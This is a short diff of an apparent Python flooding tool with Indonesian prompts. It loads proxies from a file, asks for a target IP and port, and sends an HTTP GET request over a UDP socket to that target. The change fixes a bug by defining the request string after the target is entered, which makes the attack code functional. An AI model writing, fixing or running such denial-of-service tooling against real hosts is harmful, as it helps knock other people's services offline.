@@ -20,8 +20,6 @@ with open('.prox.txt', 'w') as file:
 pr(pn(logo))
 ok = 0
 no = 0
-gas = f"GET /index.html HTTP/1.1\r\nHost: {ipp}\r\n\r\n"
-
 prox = open('.prox.txt').read().splitlines()
 for proxy in prox:
     parts = proxy.strip().split(':')
@@ -32,6 +30,8 @@ for proxy in prox:
         sock.set_proxy(typee, host, prot)
 ipp = input(" [+] Masukkan IP        : ")
 port = int(input(" [+] Masukkan Port      : "))
+gas = f"GET /index.html HTTP/1.1\r\nHost: {ipp}\r\n\r\n"
+
 socky = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 server_address = (ipp, port)
 message = gas
